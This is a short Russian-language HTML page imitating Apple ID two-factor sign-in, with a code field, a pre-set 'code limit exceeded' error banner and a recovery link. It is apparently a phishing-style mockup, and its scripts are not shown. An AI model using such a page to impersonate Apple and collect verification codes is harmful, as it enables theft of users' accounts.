<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в Apple ID</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="auth-container">
        <h2>Двухфакторная аутентификация</h2>
        <p>Код проверки отправлен на ваш номер телефона.</p>
        
        <div class="error-banner" id="errorBanner">Превышен лимит отправки кодов верификации.</div>
        
        <form id="authForm">
            <input type="text" id="codeField" maxlength="6" placeholder="000000" autocomplete="off">
            <button type="submit">Подтвердить</button>
        </form>
        
        <div class="recovery-link">
            <a href="#" id="recoveryBtn">Не получили код проверки?</a>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
